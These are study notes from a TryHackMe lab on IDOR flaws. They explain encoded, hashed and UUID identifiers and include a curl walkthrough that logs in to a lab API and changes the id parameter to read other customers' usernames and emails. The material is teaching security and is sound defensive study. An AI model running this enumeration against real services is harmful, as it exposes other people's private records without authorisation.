# IDOR (TryHackMe)

- **Path:** Jr Penetration Tester > Web Application Vulnerabilities I
- **Completed:** 2026-10-10 - **Task 7 lab:** Acme-style API @ <ip>:80 (driven over VPN)

IDOR = Insecure Direct Object Reference. The app uses a user-supplied identifier to fetch an object
without checking the requester is allowed to access THAT object. Broken Access Control (OWASP #1);
same flaw is BOLA in the API Top 10. Core lesson: authentication != authorisation.

## Answer sheet

| Task | Question | Answer |
|---|---|---|
| 1 | IDOR stands for | *(find it yourself)* |
| 2 | IDOR example website flag | (View Site sim: decrement user_id to another user) |
| 3 | Common encoding used by websites | *(find it yourself)* |
| 4 | Common algorithm for hashing IDs | *(find it yourself)* |
| 5 | Min accounts to test IDOR between accounts | *(find it yourself)* |
| 7 | Username for user id 1 | *(find it yourself)* |
| 7 | Email for user id 3 | *(find it yourself)* |

## ID reference forms (and why none of them fix IDOR)
- Plaintext (?user_id=1305): change the number. Simplest case.
- Encoded (base64, MTIz = 123, ends in =): decode -> change -> re-encode. Encoding != encryption.
- Hashed (MD5 = 32 hex, SHA1 = 40, SHA256 = 64): if input is a sequential int, hash 1,2,3.. yourself
  or look it up on CrackStation. One-way, but useless protection for small predictable inputs.
- Unpredictable (UUID): can't enumerate, so use the TWO-ACCOUNT method: grab A's id while logged in as
  B, see if B can read it. Identifier format is irrelevant; what matters is the server ownership check.

## Where IDORs hide (Task 6)
Not just the address bar: background AJAX/API calls (Network tab / Burp), endpoints referenced in JS
files, parameter mining (append ?user_id=123 to an endpoint that normally uses only the session),
POST bodies, cookies, headers, REST path segments (/api/users/123/orders). Intercept EVERY request.

## Task 7 practical - API IDOR (done over VPN)
Background call /api/v1/customer?id={your_id} returns JSON {id,username,email}. 401 unauth, so sign
up + log in first, then just change id:
```
curl -s -c cookies.txt -d "username=u1&email=u1@test.thm&password=Pass123!&cpassword=Pass123!" http://<ip>/customers/signup
curl -s -b cookies.txt -c cookies.txt -d "username=u1&password=Pass123!" http://<ip>/customers/login
curl -s -b cookies.txt "http://<ip>/api/v1/customer?id=1"   # {"id":1,"username":"*(find it yourself)*","email":"*(find it yourself)*"}
curl -s -b cookies.txt "http://<ip>/api/v1/customer?id=3"   # {"id":3,"username":"*(find it yourself)*","email":"*(find it yourself)*"}
```
Walking id=1..5 dumped the whole customer table (*(find it yourself)*). The
server checks you are logged in (auth) but never that the record is yours (authz).

## Lessons / defence
- authentication (who you are) != authorisation (what you may access). IDOR is a missing authz check.
- Fix: server-side ownership/permission check on every object access ("does this session own X?").
  Obscuring the id (encode/hash/UUID) is not a fix; it only raises the enumeration cost.
- Test background API calls and do parameter mining, not just the URL bar.
